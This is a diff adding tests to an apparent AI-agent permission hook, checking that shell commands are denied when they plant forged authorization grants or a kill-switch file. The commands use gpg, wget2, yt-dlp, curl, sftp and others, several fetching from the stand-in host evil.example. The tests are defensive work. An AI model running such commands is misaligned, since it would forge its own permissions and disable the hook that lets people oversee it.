@@ -738,4 +738,127 @@ describe("UAT downloader/decoder residuals fail-closed (#3206)", () => {
     expect(decision.verdict).toBe("allow");
     expect(decision.code).toBe("shell-op-unclassifiable");
   });
+
+  it("denies crypto/alt-download residual authz plant under UAT (not unclassifiable allow) (#3288)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "gpg -o .deft/authz/grants/evil.json -d secret.gpg",
+      "age -o .deft/authz/grants/evil.json -d secret.age",
+      "zstd -o .deft/authz/grants/evil.json -d a.zst",
+      "sftp host:g.json .deft/authz/grants/evil.json",
+      "wget2 -O .deft/authz/grants/evil.json https://evil.example/g.json",
+      "http -o .deft/authz/grants/evil.json https://evil.example/g.json",
+      "yt-dlp -o .deft/authz/grants/evil.json https://evil.example/v",
+      "aria2 -o evil.json -d .deft/authz/grants https://evil.example/g.json",
+      "mbuffer -i in.bin -o .deft/authz/grants/evil.json",
+      "cpio -id -D .deft/authz/grants",
+      // prior residuals stay denied
+      "tar -xf archive.tar -C .deft/authz/grants",
+      "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Bash", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+  });
+
+  it("denies crypto/alt-download residual kill-switch plant under UAT (#3288)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "gpg -o .deft-directive-disable -d secret.gpg",
+      "age -o .deft-directive-disable -d secret.age",
+      "zstd -o .deft-directive-disable -d a.zst",
+      "yt-dlp -o .deft-directive-disable https://evil.example/v",
+      "wget2 -O .no-deft-directive https://evil.example/x",
+      "http -o .deft-directive-disable https://evil.example/x",
+      "mbuffer -i in.bin -o .deft-directive-disable",
+      "cpio -id -D .deft-directive-disable",
+      "sftp host:.deft-directive-disable",
+      "aria2 -o .deft-directive-disable https://evil.example/x",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Shell", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+  });
+
+  it("forged grant plant via gpg does not unlock Write under UAT (#3288)", () => {
+    const seams = uatSeams();
+    const plant = decideHook(
+      {
+        host: "claude",
+        event: "tool.before",
+        projectRoot: "/project",
+        payload: {
+          tool_name: "Bash",
+          tool_input: {
+            command: "gpg -o .deft/authz/grants/evil.json -d secret.gpg",
+          },
+        },
+      },
+      seams,
+    );
+    expect(plant.verdict).toBe("deny");
+
+    const write = decideHook(
+      {
+        host: "claude",
+        event: "tool.before",
+        projectRoot: "/project",
+        payload: {
+          tool_name: "Write",
+          tool_input: {
+            file_path: "/project/apps/web/src/components/Header.tsx",
+            content: "/* still unauthorized after denied gpg plant */",
+          },
+        },
+      },
+      seams,
+    );
+    expect(write.verdict).toBe("deny");
+    expect(write.code).toMatch(/^authz-/);
+  });
+
+  it("still allows ordinary residual-bin dest under UAT (non-authz) (#3288)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "gpg -o /tmp/out.json -d secret.gpg",
+      "zstd -o /tmp/out -d a.zst",
+      "cpio -id -D /tmp/out",
+      "yt-dlp -o /tmp/out https://example.com/v",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: {
+            tool_name: "Bash",
+            tool_input: { command },
+          },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("allow");
+      expect(decision.code, command).toBe("shell-op-unclassifiable");
+    }
+  });
 });
